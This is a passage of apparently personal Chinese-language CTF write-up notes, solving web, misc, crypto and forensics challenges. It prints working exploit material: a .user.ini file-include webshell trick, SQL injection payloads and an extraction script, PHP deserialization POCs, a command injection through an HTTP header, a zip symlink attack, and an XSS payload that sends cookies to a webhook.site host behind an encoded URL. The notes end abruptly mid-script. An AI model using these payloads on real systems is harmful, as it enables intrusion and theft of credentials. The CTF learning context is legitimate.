![image-20240122200632716](./assets/image-20240122200632716.png)

然后改为POST就可以下载了，这里好玄学

然后发现Java的信息泄露都是这个

![image-20240122200701769](./assets/image-20240122200701769.png)

然后下载下来WEB-INF/web.xml然后得到如下

```xml
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd" version="4.0">
<welcome-file-list>
<welcome-file>Index</welcome-file>
</welcome-file-list>
<servlet>
<servlet-name>IndexController</servlet-name>
<servlet-class>com.wm.ctf.IndexController</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>IndexController</servlet-name>
<url-pattern>/Index</url-pattern>
</servlet-mapping>
<servlet>
<servlet-name>LoginController</servlet-name>
<servlet-class>com.wm.ctf.LoginController</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>LoginController</servlet-name>
<url-pattern>/Login</url-pattern>
</servlet-mapping>
<servlet>
<servlet-name>DownloadController</servlet-name>
<servlet-class>com.wm.ctf.DownloadController</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>DownloadController</servlet-name>
<url-pattern>/Download</url-pattern>
</servlet-mapping>
<servlet>
<servlet-name>FlagController</servlet-name>
<servlet-class>com.wm.ctf.FlagController</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>FlagController</servlet-name>
<url-pattern>/Flag</url-pattern>
</servlet-mapping>
</web-app>
```

然后看到com.wm.ctf.FlagController

把class下载下来即可看到

![image-20240122202227348](./assets/image-20240122202227348.png)

然后补充一点知识

8.2.3、<servlet-mapping>

<servlet-name>：Servlet的名字，唯一性和一致性，与元素中声明的名字一致。
<url-pattern：指定相对于Servlet的URL的路径。该路径相对于web应用程序上下文的根路径。将URL模式映射到某个Servlet，即该Servlet处理的URL。

8.2.4、加载Servlet的过程

容器的Context对象对请求路径(URL)做出处理，去掉请求URL的上下文路径后，按路径映射规则和Servlet映射路径（）做匹配，如果匹配成功，则调用这个Servlet处理请求。



不得不感慨一些工具对于生产力的提升的举足轻重的作用！Wappalyzer是目前遇到最好的插件！！！

先用Wappalyzer插件分析文件体系结构![image-20240114104041970](./assets/image-20240114104041970.png)

Apache的一个关键点在于.htaccess,但是nginx的一个关键点在.user.ini

这个是.user.ini绕过，这里对.user.ini进行解释

## .user.ini

我们先在php手册上看一下对`.user.ini`的介绍：

也就是说我们可以在`.user.ini`中设置`php.ini`中**PHP_INI_PERDIR** 和 **PHP_INI_USER** 模式的 INI 设置，而且只要是在使用 **CGI／FastCGI** 模式的服务器上都可以使用`.user.ini`

在p牛的文章中提到了两个有趣的设置：**auto_prepend_file**和**auto_append_file**

我们再到手册中看了下这两个设置的定义：

大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），**类似于在index.php中插入一句：`require(./a.jpg);`**

这两个设置的区别只是在于**auto_prepend_file**是在文件前插入；**auto_append_file**在文件最后插入（当文件调用的有`exit()`时该设置无效）

由于这里的审查有exif格式的审查，所以前缀放一个 GIF89a

.user.ini的文件内容

```
GIF89a
auto_prepend_file=a.jpg
```

a.jpg的文件内容

```
GIF89a
<script language='php'>system('cat /flag');</script>
```

这里有对于<?的过滤，所以采用script的方式执行php代码

然后访问该目录下的index.php即可获得flag，注意是访问Index.php因为这个.user.ini是在加载index.php之前执行了a.jpg，即执行了payload





感觉PHP还是学少了:sob:

先审计源码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

text利用data协议就可以，然后可以用include()函数读取源码（这一点没想到）php://filter/read=convert.base64-encode/resource=[*文件*名]，然后即再构造序列化对象即可

payload

```shell
http://30f04918-2bb4-43da-9e3d-5a3313311db9.node4.buuoj.cn:81/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```



emm SQl注入不会啊:sob:

先打开然后看到用户的登录

然后尝试输入1'or'1'#这里注意到在账号或者密码部分输入这个都行

毕竟sql语句是这样的，唯一需要care的是在hackbar或者url中输入的时候要把#替换成%23,如果输入#可能会被hackbar和浏览器认为是注释

这里后面是选用了报错注入

SQL报错注入常用函数 两个基于XPAT（XML)的报错注入函数 函数updatexml() 是mysql对xml文档数据进行查询和修改的xpath函数

```sql
1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#
```

然后后面即可获取flag的内容

语句的讲解：

1. `updatexml(1,concat(0x7e,database(),0x7e),1)` 是一个特定于 MySQL 的函数，用于更新 XML 文档。在这种情况下，它用于构建一个字符串，其中包含由 `0x7e` 字符（代表波浪线 `~`）括起的数据库名称。`concat` 函数用于连接这些元素。
2. `#` 是 SQL 中的注释字符。`#` 后的所有内容都被视为注释，数据库服务器会忽略它。

先审计一下代码，不懂自己都在干啥

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str); //会调用__destruct函数
    }

}
```

经典的反序列化问题，但是is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。

不知道自己一直在传什么

发现大多数php在线运行环境都没有显示这种不可见符。找到一个可以显示的<a href="https://www.toolnb.com/dev/runCode.html">php在线运行</a>，但是这里的\00并没有办法过去is_valid()函数，于是

绕过方法：PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过。==即我们最后在构造poc的时候，用public来修饰属性==

首先我们看到了read()里面的file_get_contents敏感函数process()中有调用了read()函数，条件是op == “2”
__destruct()调用了process()函数，条件是op!==“2”
可以看到这里有个弱类型的问题，构造op=2即可绕过了

然后即可传递序列化对象即可

```php
<?php
class FileHandler {
    public $op=2;
    public $filename="flag.php";
    public $content="HappyCoder";
}
$a=new FileHandler();
echo serialize($a);
?>
```



注意后面查看源码，而不是对着result：0发呆





不是哥们，这是web题？？？你放到misc题目里面好吧

直接在[Glyphr](https://www.glyphrstudio.com/app/)搜一下字体就可以了

然后获取flag

![image-20240416010617087](C:/Users/86186/Desktop/write-up/ctfs/Amateursctf/assets/image-20240416010617087.png)

很有意思的一道题

先看js源码

```js
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

```

主要是app.get()和req.method=="GET"的绕过，误打误撞试了一下所有的method然后获得了flag

正确的解法：

先用Option试一下可以的method

发现返回了GET、HEAD，

而[HEAD](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD) *method is identical to* [GET](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) *method, but the server does not return a message-body in the response.*
*This can be used to obtain meta-information about the entity implied by the request without transferring the entity-body itself.*
*Express automatically maps the* `HEAD` *method to the* `.get()` *method.*

express会自动把HEAD转化为GET，所以实现了绕过

其实想到method的漏洞点了但是没有想通透

很有意思的一道sql注入题，让我对于flask的sqlite查询函数有了崭新的理解

源码如下

```python
from flask import Flask, request, make_response
import sqlite3
import os
import re

app = Flask(__name__)
db = sqlite3.connect(":memory:", check_same_thread=False)
flag = open("flag.txt").read()


@app.route("/")
def home():
    return """
    <h1>You have one shot.</h1>
    <form action="/new_session" method="POST"><input type="submit" value="New Session"></form>
    """


@app.route("/new_session", methods=["POST"])
def new_session():
    id = os.urandom(8).hex()
    db.execute(f"CREATE TABLE table_{id} (password TEXT, searched INTEGER)")
    db.execute(f"INSERT INTO table_{id} VALUES ('{os.urandom(16).hex()}', 0)")
    res = make_response(f"""
    <h2>Fragments scattered... Maybe a search will help?</h2>
    <form action="/search" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="query" value="">
        <input type="submit" value="Find">
    </form>
""")
    res.status = 201

    return res


@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."

    db.execute(f"UPDATE table_{id} SET searched = 1")

    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""


@app.route("/guess", methods=["POST"])
def guess():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    result = db.execute(f"SELECT password FROM table_{id} WHERE password = ?", (request.form['password'],)).fetchone()
    if result != None:
        return flag

    db.execute(f"DROP TABLE table_{id}")
    return "You failed. <a href='/'>Go back</a>"


@app.errorhandler(500)
def ise(error):
    original = getattr(error, "original_exception", None)
    if type(original) == sqlite3.OperationalError and "no such table" in repr(original):
        return "that table is gone. <a href='/'>Go back</a>"
    return "Internal server error"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

```

大概就是一次机会然后去猜password，猜对的话会给flag

感觉自己对于web源码的嗅觉不够灵敏

开始一直在想在guess()的部分用sql注入直接绕过去，后面看了exp发现是在search的部分去sql注入其实确实也是这样的，不然为什么search的函数里面是这里按理说直接用fetchone了为什么要用fetchall

```python
{"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
```

直接用union 注入获取password然后获取flag

抄了一个exp过来

```python
import requests
import re

URL = "http://one-shot.amt.rs"


# Get session id
def get_session():
    res = requests.post(URL + "/new_session")
    return res.text.split('type="hidden" name="id" value="')[1].split('"')[0]


# Search for password, use malicious query
def search(session: str, query: str):
    query = query.replace("{id}", session)
    res = requests.post(URL + "/search", data={"id": session, "query": query})
    return re.findall(r"<li>(.*?)</li>", res.text)


# Guess the password
def guess(session: str, password: str):
    res = requests.post(URL + "/guess", data={"id": session, "password": password})
    return res.text


# Build a malicious query
def build_query():
    query = "%' OR 1=1"

    for n in range(1, 33):
        query += f" UNION ALL SELECT SUBSTRING(password, {n}, 1) FROM table_" + "{id}"

    return query + " --"


session = get_session()

vals = search(session, build_query())
vals = [val for val in vals if len(val) == 1] # get only characters
print(guess(session, "".join(vals)))
```



感觉多花点时间去琢磨而不是直接去看答案确实会收获好大

先审源码

```js
const express = require('express')
const puppeteer = require('puppeteer');
const cookieParser = require("cookie-parser");
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express()
const port = process.env.PORT || 3000

const CONFIG = {
  APPURL: process.env['APPURL'] || `http://127.0.0.1:${port}`,
  APPFLAG: process.env['APPFLAG'] || "fake{flag}",
}
console.table(CONFIG)

const limiter = rateLimit({
	windowMs: 60 * 1000, // 1 minute
	limit: 4, // Limit each IP to 4 requests per `window` (here, per minute).
	standardHeaders: 'draft-7',
	legacyHeaders: false,
})

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.set('views', __dirname + '/views');
app.use(express.static("./public"));
app.engine('html', require('ejs').renderFile);
app.set('view engine', 'ejs');

function sleep(s){
  return new Promise((resolve)=>setTimeout(resolve, s))
}

app.get('/', (req, res) => {
  res.render('index.html');
})

app.get('/admin/view', (req, res) => {
  if (req.cookies.flag === CONFIG.APPFLAG) {
    res.send(req.query.content);
  }
  else {
    res.send('You are not Walter White!');
  }
})

app.post('/review', limiter,  async (req, res) => {
  const initBrowser = puppeteer.launch({
      executablePath: "/opt/homebrew/bin/chromium",
      headless: true,
      args: [
          '--disable-dev-shm-usage',
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-gpu',
          '--no-gpu',
          '--disable-default-apps',
          '--disable-translate',
          '--disable-device-discovery-notifications',
          '--disable-software-rasterizer',
          '--disable-xss-auditor'
      ],
      ignoreHTTPSErrors: true
  });
  const browser = await initBrowser;
  const context = await browser.createBrowserContext()
  const content = req.body.content.replace("'", '').replace('"', '').replace("`", '');
  const urlToVisit = CONFIG.APPURL + '/admin/view/?content=' + content;
  try {
      const page = await context.newPage();
      await page.setCookie({
          name: "flag",
          httpOnly: false,
          value: CONFIG.APPFLAG,
          url: CONFIG.APPURL
      })
      await page.goto(urlToVisit, {
          waitUntil: 'networkidle2'
      });
      await sleep(1000);
      // Close
      await context.close()
      res.redirect('/')
  } catch (e) {
      console.error(e);
      await context.close();
      res.redirect('/')
  }
})

app.listen(port, () => {
  console.log(`Purdue winning on port ${port}`)
})
```

明显的问题在/review的路由下面，然后本地搭了一个简陋的版本发现构造

```
http://127.0.0.1:3000/test?content=<script>alert("666")</script>
```

会弹框，做实为xss漏洞，然后考虑怎么出网，原本担心有同源策略

后面发现同源策略它可以防止互联网上的恶意网站在浏览器中运行 JS 脚本，

在脚本内部执行是可以的比如这样就可以成功（为什么没有尝试）

```
http://127.0.0.1:3000/test?content=%3Cscript%3Efetch(%22https://webhook.site/9878cda8-3dd6-4caf-959a-ab2632d70dc4?flag=test%22)%3C/script%3E
```

然后构造exp，直接用asill码就可以，别用浏览器本身测试！！会有同源策略的限制

```js
<script>fetch(String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 119, 101, 98, 104, 111, 111, 107, 46, 115, 105, 116, 101, 47, 57, 56, 55, 56, 99, 100, 97, 56, 45, 51, 100, 100, 54, 45, 52, 99, 97, 102, 45, 57, 53, 57, 97, 45, 97, 98, 50, 54, 51, 50, 100, 55, 48, 100, 99, 52, 63, 102, 108, 97, 103, 61)%2bdocument.cookie)</script>

```

然后即可拿到flag！！！困扰最大的难题竟然是自己的出网策略:sob:

![image-20240419152802598](C:/Users/86186/Desktop/write-up/ctfs/b01lersCTF/assets/image-20240419152802598.png)

感觉还是太菜了，最后甚至没有进前100，也有投入时间一般的原因，学一点其他方向然后后面方便打校赛吧

# Web

## Popgadget

https://bbs.kanxue.com/thread-271714.htm

wc,对于php的各种pop链还是太生疏了

直接放个wp把



## zupload

审计源码然后将action改为/flag即可获取flag

## zupload-pro

直接用php伪协议读取**php://filter/read=convert.base64-encode/resource=/flag**

## zupload-pro-plus-max

一直在卡我的题目，后面看了wp才知道include解析zip包中的php代码即可

## zupload-pro-max

同样用php伪协议读取php://filter/read=convert.base64-encode/resource=/flag

## zupload-pro-plus-max-ultra

代码中有

```php
$extract_to = $_SERVER['HTTP_X_EXTRACT_TO'] ?? 'uploads/';

...

exec('unzip ' . $file_tmp . ' -d ' . $extract_to);
```

直接往 Header 中传入 `X-EXTRACT-TO: .; cat /flag > flag.txt` 随便上传个文件，然后访问 `/flag.txt` 把 Flag 下载下来就行了。

## zupload-pro-plus-max-ultra-premium

这题是 Unzip 软链接漏洞，先准备个 Payload：

```
touch /flag
ln -s /flag flag
zip --symlinks payload.zip flag
```

上传后再下载 `/uploads/flag` 就行了。

## sql教学局

感觉比较简单的sql注入！甚至有回显

主要是用双写和/**/绕过空格，感觉跟信息安全综合实践二的web题差不多

flag
第一段：flag{f5729aaa-
http://101.32.220.189:31777/challenge.php?user=1'/**/union/**/selselectect/**/flag/**/frfromom/**/secret.passwoorrd%23
第二段：3d49-475e-9731  http://101.32.220.189:31777/challenge.php?user=1'/**/union/**/selselectect/**/grade/**/frfromom/**/scoorre/**/where/**/student/**/like/**/'begin'%23
第三段：-e15fd5d2891d} 
爆字段：
http://101.32.220.189:32067/challenge.php?user=1'/**/union/**/selselectect/**/group_concat(column_name)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/'scoorre'%23
flag{f5729aaa-3d49-475e-9731-e15fd5d2891d} 

# Misc

## tupper

先base64再

[tupper解密](https://tuppers-formula.ovh/)

## check ln

直接base32转码

## devils's word

先转换语言，然后搜索发现是温州话，之前找到过魔鬼语言温州话，但是没具体往下走

```python
with open("devil's word.txt", 'r') as f:
    data = f.read().strip().split(' ')

table = {
    'leng': '0', 'lia': '2', 'sa': '3', 'sii': '4', 'bo': '8',
    'ng': '5', 'leu': '6', 'cai': '7', 'jau': '9',
    'a': 'a', 'b': 'b', 'c': 'c', 'd': 'd', 'e': 'e', 'f': 'f'}

result = b''
for i in range(0, len(data), 2):
    result += bytes([int(table[data[i]]+table[data[i + 1]], 16)])

print(result.decode())
```

## where  is crazyman 1.0

直接google搜图然后发现为秋叶原

## where is crazyman v2.0

直接google搜图找到facebook

然后发现即可

## Crypto

感觉对RSA算法的理解有问题

这是一个多素数RSA算法问题

```python
from Crypto.Util.number import *
import gmpy2

def fakeN_list():
    puzzle_list = []

    for i in range(15):
        r = getPrime(32)
        puzzle_list.append(r)

    p = getPrime(32)
    q = getPrime(32)
    com = p * q

    puzzle_list.append(com)

    return puzzle_list

def encrypt(m, e, fake_n_list):
    fake_n = 1
    for i in range(len(fake_n_list)):
        fake_n *= fake_n_list[i]

    really_n = 1
    for i in range(len(fake_n_list) - 1):
        really_n *= fake_n_list[i]

    c = pow(m, e, really_n)

    print("c =", c)
    print("fake_n =", fake_n)

e = 65537
r_s = [3244171123, 3702684709, 3072724321, 4018595311, 3724163987, 3020377819, 3771381161, 2785127861, 3892394453, 2884753607, 3784497139, 3794842819, 3122320321, 3961291277, 2753880739, 3057624863, 3108016309]
c = 65357276094579455978357225670976535341727886147857522808384849982116709060700184781790632917498365870903934069344805591544583535937894022934706
fake_n = 914762571999137286435259336379720674119704253903171474927358573188112683048519393703661411927034789214975261873387988753423525574742149601424917938820732224411251
flag_real = "flag{test}".encode()
m = bytes_to_long(flag_real)

for p in r_s:
    for q in r_s:
        if q == p:
            continue
        else:
            really_n = int(fake_n // (p * q))
            new_list = [x for x in r_s if x not in {p, q}]
            phi = 1
            for i in new_list:
                phi *= i-1
            d = gmpy2.invert(e, phi)
            flag = pow(c, d, really_n)
            print(flag)
            print(long_to_bytes(flag))
```

# Forensics

## 逆向工程(reverse)入门指南

有不可见字符，直接复制粘贴出来即为flag

## 学取证咯 - cmd

直接cmdline可以发现flag

## 学取证咯-还记得ie吗学取证咯 - 还记得 ie 吗？

$ vol.py -f 学取证咯.raw --profile=Win7SP1x64 iehistory

## 学取证咯 - 计算机的姓名？

$ vol.py -f 学取证咯.raw --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"

## 学取证咯 - 想登录我的计算机吗?

mimikatz一把梭

```shell
vol.py -f 学取证咯.raw --profile=Win7SP1x64 mimikatz
```

##  学取证咯 - 机密文件

filescan 扫描到桌面有个机密文件.docx，dump 下来打开就是了

## 学取证咯 - 真的是取证吗？

关键逻辑如下：

![](https://notes.sjtu.edu.cn/uploads/upload_9d6f2a8535a8eadc243df34a72e9c1df.png)

桌面有个 flag_is_here.exe, dump 下来，ida 搜 flag 然后交叉引用找到关键函数，发现就一个简单的异或 FLAG_KEY 不知道，直接根据密文的第一位和 flag 的 f 异或，得到 key 为 121 

; DATA XREF: sub_401460+102↑o
.rdata:0040B06D unk_40B06D      db 0BBh                 ; DATA XREF: sub_401460+112↑o

这里指交叉引用（说的是哪里引用了这部分)

`data =[31, 21, 24, 30, 2, 32, 73, 15,
       74, 38, 21, 74, 57, 11, 23, 74,
       29, 38, 17, 73, 15, 15, 38, 13,
       73, 38, 31, 73, 11, 74, 23, 76,
       16, 26, 76, 4]

for i in data:
    print(chr(i ^ 121), end="")

## 饥渴 C 猫 is hacker!

看一位师傅的wp发现

payload.bin 是使用 USB Rubber Ducky 编译 DuckyScript 后生成的文件 github 找到解析工具 [Duck-Decoder](https://github.com/JPaulMora/Duck-Decoder) 解析 payload.bin 就能看到 flag 了


游戏题目都逃不过F12的命运，直接F12分析源码

```js
 function win(history) {
    const code = encode(history) + ";" + prompt("Name?");

    const saveURL = location.origin + "?code=" + code;
    displaywrapper.classList.remove("hidden");

    const score = history.length;

    display.children[1].innerHTML = "Your score was: <b>" + score + "</b>";
    display.children[2].href =
      "https://twitter.com/intent/tweet?text=" +
      encodeURIComponent(
        "Can you beat my score of " + score + " in Dice Dice Goose?",
      ) +
      "&url=" +
      encodeURIComponent(saveURL);

    if (score === 9) log("flag: dice{pr0_duck_gam3r_" + encode(history) + "}");
  }
```

然后发现要求score等于9的时候会给flag，然后开始思考如何构造一个score=9的history，然后发现直上直下是可以的。

var myVariable = [
    [
        [0, 1],
        [9, 9]
    ],
    [
        [1, 1],
        [9, 8]
    ]
    [
        [2, 1],
        [9, 7]
    ]
    [
        [3, 1],
        [9, 6]
    ]
    [
        [4, 1],
        [9, 5]
    ]
    [
        [5, 1],
        [9, 4]
    ]
    [
        [6, 1],
        [9, 3]
    ]
    [
        [7, 1],
        [9, 2]
    ]
    [
        [8, 1],
        [9, 1]
    ]
];

即可获取flag

很有意思的一道js题目

```js
const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);

const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;

app.use(express.urlencoded({ extended: false }));
app.use(express.static("public"));

app.post("/api/login", (req, res) => {
    const { user, pass } = req.body;

    const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
    try {
        const id = db.prepare(query).get()?.id;
        if (!id) {
            return res.redirect("/?message=Incorrect username or password");
        }

        if (users[id] && isAdmin[user]) {
            return res.redirect("/?flag=" + encodeURIComponent(FLAG));
        }
        return res.redirect("/?message=This system is currently only available to admins...");
    }
    catch {
        return res.redirect("/?message=Nice try...");
    }
});
```

看到是拼接sql语句于是可以构造1' or 1=1 #

注意这里后面的or 1=1 要改成id=1主要是为了防止筛选出多个id然后报错

然后即可想办法满足这个 isAdmin[user]

这里用JavaScript的原型链污染，

isAdmin. 

isAdmin.\_\_proto\__             isAdmin.constructor           isAdmin.hasOwnProperty        isAdmin.isPrototypeOf         isAdmin.propertyIsEnumerable   isAdmin.toLocaleString        isAdmin.toString              isAdmin.valueOf

然后即可输入isAdmin.\_\_proto\__来实现isAdmin[user]=true

这里纠正一下这几种写法都是相同的(表示python的字典写少了)：

```
Foo.prototype
foo["__proto__"]
foo.__proto__
foo.constructor.prototype
```

然后即可构造成功



很符合misc的一道题，先给了zsh脚本文件的源码

```sh
#!/bin/zsh
print -n -P "%F{green}Specify your charset: %f"
read -r charset
# get uniq characters in charset
charset=("${(us..)charset}")
banned=('*' '?' '`')

if [[ ${#charset} -gt 6 || ${#charset:|banned} -ne ${#charset} ]]; then
    print -P "\n%F{red}That's too easy. Sorry.%f\n"
    exit 1
fi
print -P "\n%F{green}OK! Got $charset.%f"
charset+=($'\n')

# start jail via coproc
coproc zsh -s
exec 3>&p 4<&p

# read chars from fd 4 (jail stdout), print to stdout
while IFS= read -u4 -r -k1 char; do
    print -u1 -n -- "$char"
done &
# read chars from stdin, send to jail stdin if valid
while IFS= read -u0 -r -k1 char; do
    if [[ ! ${#char:|charset} -eq 0 ]]; then
        print -P "\n%F{red}Nope.%f\n"
        exit 1
    fi
    # send to fd 3 (jail stdin)
    print -u3 -n -- "$char"
done
```

就是根据zsh然后想办法执行getflag就可以了

先试一下find .,获取当前目录下的文件

```shell
root@cyny666:~# nc mc.ax 31774
Specify your charset: find .

OK! Got f i n d   ..
find .
.
./y0u
./y0u/w1ll
./y0u/w1ll/n3v3r_g3t
./y0u/w1ll/n3v3r_g3t/th1s
./y0u/w1ll/n3v3r_g3t/th1s/getflag
./run
```

然后想办法执行这个exe  ./y0u/w1ll/n3v3r_g3t/th1s/getflag

这里可以用字符匹配，但是禁用了*和?

于是可以用正则匹配

```
[--~][--~][--~]/[--~][--~][--~][--~]/[--~][--~][--~][--~][--~][--~][--~][--~][--~]/[--~][--~][--~][--~]/[--~][--~][--~][--~][--~][--~][--~]
```

然后即可执行这个文件

第一次发现cyberchef还能做jpg图片题如图：

![image-20231106140517501](./assets/image-20231106140517501.png)

然后扫了一下png的文件格式

![image-20231106140903405](./assets/image-20231106140903405.png)

修改长宽尝试后会发现即可获取flag（老外的网站也确实好）



google ctf的题目的质量确实靠谱（后面可以再去做一做）

题目描述：We were building a web app but the new CEO wants it remade in php.

我是傻逼（他给了两个网站、第一个是用flask框架写的，第二个是用php写的！！！妈的怎么这都没看出来）

然后看注册的代码

```python
@authorized.route('/signup', methods=['POST'])
def signup_post():
    raw_request = request.get_data()
    username = request.form.get('username')
    password = request.form.get('password')
    tier = models.Tier(request.form.get('tier'))

    if(tier == models.Tier.GOLD):
        flash('GOLD tier only allowed for the CEO')
        return redirect(url_for('authorized.signup'))

    if(len(username) > 15 or len(username) < 4):
        flash('Username length must be between 4 and 15')
        return redirect(url_for('authorized.signup'))

    user = models.User.query.filter_by(username=username).first()

    if user:
        flash('Username address already exists')
        return redirect(url_for('authorized.signup'))

    new_user = models.User(username=username, 
        password=generate_password_hash(password, method='sha256'), tier=tier.name)

    db.session.add(new_user)
    db.session.commit()

    requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
    return redirect(url_for('authorized.login'))
```

登录的代码

```python
function insertUser($username, $password, $tier)
{
	$hash = password_hash($password, PASSWORD_BCRYPT);
	if($hash === false) {
		http_response_code(500);
		exit();
	}
	$host = getenv("DB_HOST");
	$dbname = getenv("MYSQL_DATABASE");
	$charset = "utf8";
	$port = "3306";

	$sql_username = "forge";
	$sql_password = getenv("MYSQL_PASSWORD");
	try {
		$pdo = new PDO(
			dsn: "mysql:host=$host;dbname=$dbname;charset=$charset;port=$port",
			username: $sql_username,
			password: $sql_password,
		);

		$pdo->exec("CREATE TABLE IF NOT EXISTS Users (username varchar(15) NOT NULL, password_hash varchar(60) NOT NULL, tier varchar(10) NOT NULL, PRIMARY KEY (username));");
		$stmt = $pdo->prepare("INSERT INTO Users Values(?,?,?);");
		$stmt->execute([$username, $hash, $tier]);
		echo "User inserted";
	} catch (PDOException $e) {
		throw new PDOException(
			message: $e->getMessage(),
			code: (int) $e->getCode()
		);
	}
}
```

然后获取flag的方式，这里需要tier要是gold

```php
if ($tier === "gold") {
        $response .= " " . getenv("FLAG");
    }
```

但是要设置tier为gold的话需要管理员（原本想着如何获取管理员，后来发现不需要获取管理员权限）

In Flask, the framework will read first parameter while in PHP the program will read the second parameter. 

然后后面加一个&tier=gold用来被php读取就行了

后面学到这叫参数污染

传入两个或多个相同参数但是不同值，影响服务器收到的参数值的处理

**jsp+apache接受最后一个**

**asp+iis全部接受**

**flask第一个**

**django最后一个**

这里主要是一个flask和php的区别

![image-20231030164350703](./assets/image-20231030164350703.png)

然后发包利用第二个网站登录即可



没有仔细做题直接看wp就会复现很慢（而且出很多问题、而且还是英文的wp（再一次感叹自己的英文水平弱小:sob:)）

先对网站大概扫一下发现是一个提供在线解base91的网站（只不过会有点小问题）

先代码审计一下（主要是扫一下代码）

```html
<h2 class="subtitle">{{encoding["text"]|safe}}</h2>
```

这里对text直接解码了就会有xss漏洞（下次遇见xss漏洞就不会那么措不及防了）

然后主要看create如何创建带有攻击性的字符

```python
def create():
    if not session:
        flash("Please log in")
        return redirect("/login")
    if request.method == "GET":
        return render_template("create.html", logged_out=False)
    elif request.method == "POST":
        if not request.form["text"]:
            return "Missing text"
        text = request.form["text"]
        if len(text) > 1000:
            flash("Too long!")
            return redirect("/create")
        encoded = based91.encode(text.encode() if not (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0) else bytes.fromhex(text))
        encoding_id = create_encoding(session["username"], encoded)
        
        return redirect(f"/e/{encoding_id}")
```

关键句:

```python
 encoded = based91.encode(text.encode() if not (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0) else bytes.fromhex(text))
```

这里如何判断text不是十六进制就直接encode,如果是十六进制就先用hex16进制解密一下

注意会在后面加一些东西防止xss注入

然后就开刷exp，这里学到一个网站webhook，相当于一键给自己搭了一个测试用的网站

```python
import based91
